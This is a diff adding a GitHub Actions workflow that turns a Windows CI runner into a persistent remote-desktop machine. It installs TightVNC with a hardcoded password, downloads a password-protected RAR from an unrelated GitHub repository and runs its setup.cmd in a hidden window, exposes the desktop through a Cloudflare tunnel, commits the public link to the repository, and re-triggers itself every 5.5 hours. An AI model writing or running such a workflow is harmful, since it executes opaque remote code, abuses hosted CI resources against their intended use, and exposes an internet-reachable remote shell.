@@ -1,0 +1,164 @@
+
+name: Create VPS
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  actions: write
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+      with:
+        token: ${{ secrets.GITHUB_TOKEN }}
+
+    - name: 'Run VPS Setup Script'
+      shell: pwsh
+      run: |
+        $ErrorActionPreference = "Stop"
+        try {
+          Write-Host "📥 Installing TightVNC..."
+          Invoke-WebRequest -Uri "https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi" -OutFile "tightvnc-setup.msi"
+          Start-Process msiexec.exe -Wait -ArgumentList '/i tightvnc-setup.msi /quiet /norestart ADDLOCAL="Server" SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=hcxhcx SET_ACCEPTHTTPCONNECTIONS=1 VALUE_OF_ACCEPTHTTPCONNECTIONS=1 SET_ALLOWLOOPBACK=1 VALUE_OF_ALLOWLOOPBACK=1'
+          Write-Host "✅ TightVNC installed"
+
+          Write-Host "📥 Installing WinRAR..."
+          Invoke-WebRequest -Uri "https://www.rarlab.com/rar/winrar-x64-624.exe" -OutFile "winrar-setup.exe"
+          Start-Process -FilePath ".\winrar-setup.exe" -ArgumentList "/S" -Wait
+          $env:Path += ";C:\Program Files\WinRAR"
+          Write-Host "✅ WinRAR installed and added to PATH"
+
+          Write-Host "📥 Downloading custom setup package..."
+          Invoke-WebRequest -Uri "https://github.com/afacadr/oyep/raw/refs/heads/TimothyStiles-patch-1/setup.rar" -OutFile "setup.rar"
+          Write-Host "✅ Custom setup package downloaded."
+
+          Write-Host "📦 Extracting custom setup..."
+          & "C:\Program Files\WinRAR\WinRAR.exe" x -p"hcxhcx" -o+ -ibck ".\setup.rar"
+          Write-Host "✅ Custom setup extracted."
+
+          # Add a delay to ensure the filesystem is synchronized
+          Start-Sleep -Seconds 3
+
+          Write-Host "🔍 Searching for setup.cmd..."
+          $setupFile = Get-ChildItem -Path . -Recurse -Filter "setup.cmd" | Select-Object -First 1
+          
+          if ($setupFile) {
+              $setupCmdPath = $setupFile.FullName
+              Write-Host "✅ Found setup.cmd at: $setupCmdPath"
+              Write-Host "🚀 Running setup.cmd in the background..."
+              Start-Process -FilePath $setupCmdPath -WindowStyle Hidden
+              Write-Host "✅ setup.cmd is running."
+          } else {
+              Write-Host "❌ ERROR: setup.cmd not found after extraction."
+              Write-Host "Listing extracted files for debugging:"
+              Get-ChildItem -Recurse
+              exit 1
+          }
+
+          Write-Host "🔧 Configuring TightVNC to allow loopback connections..."
+          # We set the key for both Local Machine (if run as service) and Current User (if run as application).
+          $regPaths = @("HKLM:\SOFTWARE\TightVNC\Server", "HKCU:\Software\TightVNC\Server")
+          foreach ($path in $regPaths) {
+            if (-not (Test-Path $path)) {
+              New-Item -Path $path -Force | Out-Null
+            }
+            Set-ItemProperty -Path $path -Name "AllowLoopback" -Value 1 -Force
+          }
+          Write-Host "✅ Loopback configuration applied."
+
+          Write-Host "🔄 Restarting TightVNC server to apply settings..."
+          Stop-Process -Name "tvnserver" -Force -ErrorAction SilentlyContinue | Out-Null
+          Start-Sleep -Seconds 3
+          Start-Process -FilePath "C:\Program Files\TightVNC\tvnserver.exe" -ArgumentList "-run"
+          Write-Host "✅ TightVNC Server started."
+          Start-Sleep -Seconds 5
+          
+          Write-Host "📥 Installing websockify..."
+          pip install --upgrade pip
+          pip install websockify==0.13.0
+
+          Write-Host "📥 Downloading noVNC client..."
+          Invoke-WebRequest -Uri "https://github.com/novnc/noVNC/archive/refs/tags/v1.4.0.zip" -OutFile "noVNC.zip"
+          Expand-Archive -Path .\noVNC.zip -DestinationPath .
+          Move-Item -Path .\noVNC-1.4.0 -Destination .\noVNC
+          Write-Host "✅ noVNC client downloaded and extracted."
+          
+          Write-Host "🚀 Starting noVNC client..."
+          Start-Process python -ArgumentList "-m websockify 6080 localhost:5900 --web .\noVNC" -WindowStyle Hidden
+          Write-Host "✅ noVNC started."
+          Start-Sleep -Seconds 5
+          
+          Write-Host "📥 Installing Cloudflared..."
+          Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
+          
+          Write-Host "🌐 Starting Cloudflared tunnel..."
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/c .\cloudflared.exe tunnel --url http://localhost:6080 --no-autoupdate > cloudflared.log 2>&1" -WindowStyle Hidden
+          
+          Write-Host "⏳ Waiting for Cloudflared URL..."
+          $urlFound = $false
+          foreach ($i in 1..30) {
+            Start-Sleep -Seconds 5
+            if (Test-Path "cloudflared.log") {
+              $logContent = Get-Content "cloudflared.log" -Raw
+              if ($logContent -match 'https://[a-zA-Z0-9-]+\.trycloudflare\.com') {
+                $cloudflaredUrl = $matches[0]
+                Write-Host "✅ Found Cloudflared URL: $cloudflaredUrl"
+                $urlFound = $true
+                break
+              }
+            }
+            Write-Host "Still waiting for URL... ($i/30)"
+          }
+          
+          if (-not $urlFound) {
+            Write-Host "❌ Failed to retrieve Cloudflared URL after 150 seconds."
+            Get-Content "cloudflared.log" -ErrorAction SilentlyContinue | Write-Host
+            exit 1
+          }
+          
+          $remoteLink = "$cloudflaredUrl"
+          Write-Host "🌌 Remote VNC URL: $remoteLink"
+          $remoteLink | Out-File -FilePath "remote-link.txt" -Encoding UTF8 -NoNewline
+          
+          Write-Host "💾 Committing remote link to repository..."
+          git config --global user.name 'github-actions[bot]'
+          git config --global user.email 'github-actions[bot]@users.noreply.github.com'
+          git add remote-link.txt
+          git commit -m "Add VNC remote link"
+          git push
+          Write-Host "✅ Remote link committed."
+        } catch {
+          Write-Host "❌ An error occurred during setup: $_"
+          exit 1
+        }
+        
+        Write-Host "🚀 VPS Session Started. This workflow will run for approximately 5.5 hours before restarting."
+        Start-Sleep -Seconds 19800
+
+    - name: 'Auto Restart Workflow'
+      if: always()
+      shell: pwsh
+      run: |
+        Write-Host "✅ Workflow finished. Triggering a new run..."
+        $repo = "${{ github.repository }}"
+        $workflow_id = "vps.yml"
+        $url = "https://api.github.com/repos/$repo/actions/workflows/$workflow_id/dispatches"
+        $token = "${{ secrets.GITHUB_TOKEN }}"
+        
+        $headers = @{
+          "Accept"        = "application/vnd.github.v3+json"
+          "Authorization" = "Bearer $token"
+        }
+        
+        $body = @{
+          "ref" = "main"
+        } | ConvertTo-Json
+        
+        Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
+        Write-Host "✅ New workflow run triggered successfully."
